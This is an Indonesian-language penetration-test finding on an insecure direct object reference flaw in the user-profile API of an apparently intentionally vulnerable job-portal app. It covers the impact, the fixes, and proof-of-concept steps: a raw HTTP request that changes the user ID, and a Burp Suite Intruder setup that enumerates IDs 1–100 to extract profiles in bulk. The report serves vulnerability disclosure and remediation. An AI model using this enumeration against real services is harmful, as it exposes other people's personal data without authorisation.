# Finding 03: Insecure Direct Object Reference (IDOR)

| Item | Detail |
|------|--------|
| **Kerentanan** | Insecure Direct Object Reference (IDOR) — Pada `/api/` |
| **Severity** |  High |
| **Skor CVSS** | 8.6 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`) |
| **Endpoint** | `/api/users/{id}/profile`, `/api/users/{id}` |

---

## Deskripsi

Kerentanan ini terjadi karena aplikasi tidak memverifikasi apakah pengguna berhak mengakses atau mengubah data milik pengguna lain. Tidak diterapkannya kontrol otorisasi atau autentikasi yang memadai di sisi server (*server-side*) memungkinkan pengguna mengganti nilai parameter acuan (seperti ID, nomor akun, atau nama file) untuk memanipulasi data yang bukan miliknya.

---

## Dampak

- **Akses dan Pembacaan Data Tanpa Izin (Unauthorized Access):** Penyerang dapat melihat data sensitif milik pengguna lain seperti profil, dokumen pribadi, atau riwayat transaksi hanya dengan mengubah parameter ID.
- **Modifikasi dan Penghapusan Data Tanpa Izin (Unauthorized Modification/Deletion):** Penyerang dapat mengubah atau menghapus informasi atau resource milik pengguna lain tanpa hak akses yang sah.
- **Pengambilalihan Akun (Account Takeover):** Penyerang dapat menguasai akun pengguna lain secara penuh jika kerentanan terdapat pada fungsi sensitif seperti fitur ubah password atau ubah email.

---

## Langkah Proof of Concept (PoC)

### Langkah 1 — Mengganti parameter ID dengan ID user lain (`1`)

**Request:**

```http
GET /api/users/1/profile HTTP/1.1
Host: jobportal.vulnapp.id
Authorization: Bearer <TOKEN_USER_BIASA>
```

**Response (Bypass Otorisasi):**

```json
{
  "id": 1,
  "username": "admin",
  "email": "admin@jobportal.vulnapp.id",
  "role": "administrator"
}
```

>  **[Capture Request & Response ID 1]**

---

### Langkah 2 — Melakukan bruteforce ID untuk mengetahui data lain (ID 1 s.d 100) menggunakan Burp Suite Intruder

Mengirimkan request ke **Burp Suite Intruder**, memasang payload position pada parameter ID (`/api/users/{§id§}/profile`), lalu menjalankan pemindaian sekuensial dari angka 1 hingga 100.

```text
Intruder Position: GET /api/users/§1§/profile HTTP/1.1
Payload Type: Numbers (Sequential 1 - 100, Step 1)
```

>  **[Capture Konfigurasi & Execution Burp Suite Intruder]**

---

### Langkah 3 — Berhasil mengekstraksi data milik pengguna lain secara masal

Seluruh request dari ID 1 hingga 100 merespons dengan status `200 OK` beserta data profil lengkap pengguna lain, mengonfirmasi kebocoran data secara masal (*mass data extraction*).

```text
Status 200 OK — Returned 100 user profiles successfully.
```

>  **[Capture Hasil Intruder / Daftar Data Pengguna yang Berhasil Diekstraksi]**

---

## Rekomendasi Perbaikan

- **Terapkan Otorisasi Berbasis Sesi di Sisi Server:** Pastikan aplikasi selalu memeriksa apakah identitas pengguna yang sedang login berdasarkan session atau JWT memiliki hak akses sah atas ID atau data yang diminta sebelum memproses perintah.
- **Gunakan Identifier Acak yang Sulit Ditebak (UUID):** Gantikan penggunaan ID berurutan atau sekuensial seperti 1, 2, 3 dengan format unik acak (*Universally Unique Identifier* / UUID) agar ID data tidak mudah ditebak.
- **Mekanisme Access Control Terpusat:** Terapkan skema kontrol akses berbasis peran (*Role-Based Access Control* / RBAC) yang konsisten di seluruh fungsi dan endpoint aplikasi.